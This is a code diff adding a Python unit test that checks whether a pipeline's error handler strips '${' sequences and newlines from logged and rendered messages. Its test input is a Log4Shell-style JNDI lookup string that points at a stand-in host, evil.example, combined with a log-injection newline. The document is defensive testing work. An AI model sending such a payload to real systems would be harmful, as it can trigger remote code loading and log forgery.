@@ -126,3 +126,33 @@ class PipelineTestCase(TestCase):
         resp = intercepted_pipeline.next_step()
         assert isinstance(resp, HttpResponse)  # TODO(cathy): fix typing on
         assert ERR_MISMATCHED_USER.encode() in resp.content
+
+    @patch("sentry.pipeline.base.render_to_response")
+    @patch("sentry.pipeline.base.logging.getLogger")
+    def test_error_sanitizes_message(
+        self, mock_get_logger: MagicMock, mock_render: MagicMock
+    ) -> None:
+        pipeline = DummyPipeline(self.request, "dummy", self.org)
+        pipeline.initialize()
+
+        mock_response = HttpResponse()
+        mock_render.return_value = mock_response
+
+        payload = "uh oh ${jndi:ldap://evil.example/}\nnext-line"
+
+        response = pipeline.error(payload)
+
+        assert response is mock_response
+
+        logger = mock_get_logger.return_value
+        logger.error.assert_called_once()
+        log_message = logger.error.call_args[0][0]
+        assert "${" not in log_message
+        assert "$ {jndi:ldap://evil.example/}" in log_message
+        assert "\n" not in log_message
+
+        mock_render.assert_called_once()
+        context = mock_render.call_args.kwargs["context"]
+        assert "${" not in context["error"]
+        assert "$ {jndi:ldap://evil.example/}" in context["error"]
+        assert "\n" not in context["error"]
